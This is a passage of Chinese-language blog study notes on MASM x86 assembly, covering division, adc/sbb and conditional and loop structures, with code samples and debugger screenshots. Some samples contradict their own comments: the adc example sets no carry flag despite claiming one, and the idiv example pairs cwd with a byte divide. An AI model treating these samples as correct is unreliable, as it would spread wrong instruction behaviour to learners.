<li>余数</li>
</ul>
<p><strong>使用格式</strong></p>
<ul>
<li>div mem/reg (除数)</li>
</ul>
<p>可以时内存或寄存器，但不能是立即数</p>
<p><strong>被除数</strong></p>
<ul>
<li>八位：AX</li>
<li>十六位：DX:ax</li>
<li>32 位：edx:eax</li>
</ul>
<p><strong>商和余数</strong></p>
<ul>
<li>八位：al ah</li>
<li>十六位：ax dx</li>
<li>32 位：eax edx</li>
</ul>
<h3 id="八位十六寄存器"><a class="anchor" href="#八位十六寄存器">#</a> 八位十六寄存器</h3>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov ax<span class="token punctuation">,</span><span class="token number">100</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	mov bl<span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	div bl</pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204185032764.png" alt="image-20220204185032764" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204185052140.png" alt="image-20220204185052140" /></p>
<p>计算结果</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204185112552.png" alt="image-20220204185112552" /></p>
<p>可以看到商为 50，余数为 0</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204185242669.png" alt="image-20220204185242669" /></p>
<p>将 ax 换成 101 进行测试</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204185354706.png" alt="image-20220204185354706" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204185410056.png" alt="image-20220204185410056" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204185424905.png" alt="image-20220204185424905" /></p>
<p>此时可以看到余数为 1</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204185448374.png" alt="image-20220204185448374" /></p>
<p>idiv 基本与 div 相同，但在执行前需要对除数进行包扩展，把一个数的最高位复制到包含这个数的变量或寄存器的高位中。</p>
<p><strong>三种扩展指令</strong></p>
<ul>
<li>cbw   字节转字</li>
<li>cwd   字转双字：ax 的符号位扩展到 dx 中</li>
<li>cdq    双字转四字：eax 的符号位扩展到 edx 中</li>
</ul>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>val sbyte <span class="token operator">-</span><span class="token number">48</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>    xor eax<span class="token punctuation">,</span>eax</pre></td></tr><tr><td data-num="20"></td><td><pre>    xor ebx<span class="token punctuation">,</span>ebx</pre></td></tr><tr><td data-num="21"></td><td><pre>    xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov al<span class="token punctuation">,</span>val</pre></td></tr><tr><td data-num="23"></td><td><pre>	cwd</pre></td></tr><tr><td data-num="24"></td><td><pre>	mov bl<span class="token punctuation">,</span><span class="token operator">+</span><span class="token number">5</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	idiv bl</pre></td></tr><tr><td data-num="26"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="28"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="29"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="30"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204190942744.png" alt="image-20220204190942744" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204190956972.png" alt="image-20220204190956972" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204191014352.png" alt="image-20220204191014352" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204191027968.png" alt="image-20220204191027968" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204191044977.png" alt="image-20220204191044977" /></p>
<h1 id="扩展加减法"><a class="anchor" href="#扩展加减法">#</a> 扩展加减法</h1>
<h2 id="加法"><a class="anchor" href="#加法">#</a> 加法</h2>
<p>进位加法 adc：将原操作数与进位标志位的值和目的操作数都相加，使用格式与 ad 一样</p>
<p><strong>样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>    mov dl<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov al<span class="token punctuation">,</span><span class="token number">0FF</span>h<span class="token punctuation">;</span>al <span class="token operator">=</span> <span class="token number">11111111</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	mov al<span class="token punctuation">,</span><span class="token number">0FF</span>h<span class="token punctuation">;</span>al <span class="token operator">=</span> <span class="token number">1111111</span> <span class="token operator">+</span> <span class="token number">1111111</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token punctuation">;</span>al <span class="token operator">=</span> <span class="token number">11111110</span> 进位标志位 <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	adc dl<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>dl <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token punctuation">;</span>dl <span class="token operator">=</span> <span class="token number">00000001</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204191958729.png" alt="image-20220204191958729" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204192010778.png" alt="image-20220204192010778" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204192023777.png" alt="image-20220204192023777" /></p>
<h2 id="减法"><a class="anchor" href="#减法">#</a> 减法</h2>
<p>进位减法 sbb：从目的操作数减去原操作数和进位标志位的一个值</p>
<p>用 32 位操作数实现 64 位减法</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>    mov edx<span class="token punctuation">,</span><span class="token number">7</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	sub eax<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">=</span> ffffffff</pre></td></tr><tr><td data-num="21"></td><td><pre>	sbb edx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token number">7</span> <span class="token operator">-</span> <span class="token number">0</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">6</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">;</span><span class="token number">00000006ffff</span>ffff</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="27"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204192742787.png" alt="image-20220204192742787" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204192759183.png" alt="image-20220204192759183" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204192811307.png" alt="image-20220204192811307" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204192825110.png" alt="image-20220204192825110" /></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言Studying Note之条件结构与条件控制流伪指令学习</title>
    <url>/article/189db1b1.html</url>
    <content><![CDATA[<h2 id="条件结构"><a class="anchor" href="#条件结构">#</a> 条件结构</h2>
<p>条件结构在 C 语言中分为</p>
<ul>
<li>顺序结构</li>
<li>选择结构</li>
<li>循环结构</li>
</ul>
<p>三大类，下面通过汇编语言模拟实现</p>
<h3 id="选择结构"><a class="anchor" href="#选择结构">#</a> 选择结构</h3>
<p>利用汇编语言模拟 <code>if else</code>  语句</p>
<p>模拟语句</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>o1 <span class="token operator">==</span> o2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    y <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    x <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    y <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>汇编语言实现</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>o1 dword <span class="token number">100</span></pre></td></tr><tr><td data-num="16"></td><td><pre>o2 dword <span class="token number">100</span></pre></td></tr><tr><td data-num="17"></td><td><pre>x dword <span class="token operator">?</span></pre></td></tr><tr><td data-num="18"></td><td><pre>y dword <span class="token operator">?</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="21"></td><td><pre>main proc</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov eax<span class="token punctuation">,</span>o1</pre></td></tr><tr><td data-num="23"></td><td><pre>	cmp eax<span class="token punctuation">,</span>o2</pre></td></tr><tr><td data-num="24"></td><td><pre>	jnz lp<span class="token punctuation">;</span>相等执行下一行</pre></td></tr><tr><td data-num="25"></td><td><pre>	mov x<span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	mov y<span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	jmp lq<span class="token punctuation">;</span>执行完跳转，结束</pre></td></tr><tr><td data-num="28"></td><td><pre>lp<span class="token operator">:</span><span class="token punctuation">;</span>不相等跳转到此处执行</pre></td></tr><tr><td data-num="29"></td><td><pre>	mov x<span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	mov y<span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr><tr><td data-num="31"></td><td><pre>lq<span class="token operator">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="34"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="35"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="36"></td><td><pre>END main</pre></td></tr></table></figure><p>jnz 指令作用</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220128153113197.png" alt="image-20220128153113197" /></p>
<h4 id="断点测试"><a class="anchor" href="#断点测试">#</a> 断点测试</h4>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220128152500855.png" alt="image-20220128152500855" /></p>
<p>相等	执行下一行代码</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220128152532547.png" alt="image-20220128152532547" /></p>
<p>执行完结束</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220128152558290.png" alt="image-20220128152558290" /></p>
<p>给 eax 赋值为 101，测试不相等时执行情况</p>
<p>可以看到程序跳转到 lp 执行</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220128152702148.png" alt="image-20220128152702148" /></p>
<p>最终结束程序</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220128152738283.png" alt="image-20220128152738283" /></p>
<h3 id="循环结构"><a class="anchor" href="#循环结构">#</a> 循环结构</h3>
<p>利用汇编语言模拟 <code>while</code>  语句</p>
<p>模拟语句</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span> i <span class="token operator">&lt;</span> <span class="token number">100</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    i <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>jle 指令作用：小于等于 / 不大于时转移</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220128153253015.png" alt="image-20220128153253015" /></p>
<p>汇编语言实现</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">100</span></pre></td></tr><tr><td data-num="20"></td><td><pre>lq<span class="token operator">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	cmp eax<span class="token punctuation">,</span>i</pre></td></tr><tr><td data-num="22"></td><td><pre>	jle lp</pre></td></tr><tr><td data-num="23"></td><td><pre>	inc i</pre></td></tr><tr><td data-num="24"></td><td><pre>	jmp lq</pre></td></tr><tr><td data-num="25"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="28"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="29"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="30"></td><td><pre>END main</pre></td></tr></table></figure><h4 id="断点测试-2"><a class="anchor" href="#断点测试-2">#</a> 断点测试</h4>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220128153727050.png" alt="image-20220128153727050" /></p>
<p>实现 <code>i &lt; 100</code>  时， <code>i ++</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220128153806025.png" alt="image-20220128153806025" /></p>
<h2 id="条件控制流伪指令"><a class="anchor" href="#条件控制流伪指令">#</a> 条件控制流伪指令</h2>
<p>32 位模式下，MASM 包含了一些高级条件控制流伪指令（conditional control flow directives），这有助于简化编写条件语句。遗憾的是，这些伪指令不能用于 64 位模式。</p>
<p>对程序进行汇编之前，汇编器执行的是预处理步骤。在这个步骤中，汇编器要识别伪指令，如：.CODE、.DATA，以及一些用于条件控制流的伪指令。</p>
<p>下表列出了这些伪指令</p>
<table>
<thead>
<tr>
<th>伪指令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>.BREAK</td>
<td>生成代码终止 .WHILE 或 .REPEAT 块</td>
</tr>
<tr>
<td>.CONTINUE</td>
<td>生成代码跳转到 .WHILE 或 .REPEAT 块的顶端</td>
</tr>
<tr>
<td>.ELSE</td>
<td>当 .IF 条件不满足时，开始执行的语句块</td>
</tr>
<tr>
<td>.ELSEIF condition</td>
<td>生成代码测试 condition，并执行其后的语句，直到碰到一个 .ENDIF 或另一个 .ELSEIF 伪指令</td>
</tr>
<tr>
<td>.ENDIF</td>
<td>终止 .IF、.ELSE 或 .ELSEIF 伪指令后面的语句块</td>
</tr>
<tr>
<td>.ENDW</td>
<td>终止 .WHILE 伪指令后面的语句块</td>
</tr>
<tr>
<td>.IF condition</td>
<td>如果 condition 为真，则生成代码执行语句块</td>
</tr>
<tr>
<td>.REPEAT</td>
<td>生成代码重复执行语句块，直到条件为真</td>
</tr>
<tr>
<td>.UNTIL condition</td>
<td>生成代码重复执行 .REPEAT 和 .UNTIL 伪指令之间的语句块，直到 condition 为真</td>
</tr>
<tr>
<td>.UNTILCXZ</td>
<td>生成代码重复执行 .REPEAT 和 .UNTILCXZ 伪指令之间的语句块，直到 CX 为零</td>
</tr>
<tr>
<td>.WHILE condition</td>
<td>当 condition 为真时，生成代码执行 .WHILE 和 .ENDW 伪指令之间的语句块</td>
</tr>
</tbody>
</table>
<h3 id="条件控制流语法"><a class="anchor" href="#条件控制流语法">#</a> 条件控制流语法</h3>
<h4 id="if使用语法"><a class="anchor" href="#if使用语法">#</a> .if 使用语法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span><span class="token keyword">if</span> condition1</pre></td></tr><tr><td data-num="2"></td><td><pre>    statements</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">[</span><span class="token punctuation">.</span>elseif condition2</pre></td></tr><tr><td data-num="4"></td><td><pre> 	statements<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token keyword">else</span></pre></td></tr><tr><td data-num="6"></td><td><pre> 	statements<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span>endif</pre></td></tr></table></figure><p><strong>使用样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="2"></td><td><pre>a1 dword <span class="token number">5</span></pre></td></tr><tr><td data-num="3"></td><td><pre>result dword <span class="token operator">?</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="6"></td><td><pre>mov eax<span class="token punctuation">,</span> <span class="token number">6</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span><span class="token keyword">if</span> eax <span class="token operator">></span> a1</pre></td></tr><tr><td data-num="8"></td><td><pre>	mov result<span class="token punctuation">,</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">.</span>endif</pre></td></tr></table></figure><h3 id="循环控制流语法"><a class="anchor" href="#循环控制流语法">#</a> 循环控制流语法</h3>
<h4 id="do-while语法"><a class="anchor" href="#do-while语法">#</a> do while 语法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>repeat</pre></td></tr><tr><td data-num="2"></td><td><pre>    statements</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span>until condition</pre></td></tr></table></figure><h4 id="while语法"><a class="anchor" href="#while语法">#</a> while 语法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span><span class="token keyword">while</span> condition</pre></td></tr><tr><td data-num="2"></td><td><pre>    statements</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span>endw</pre></td></tr></table></figure><p><strong>使用样例</strong></p>
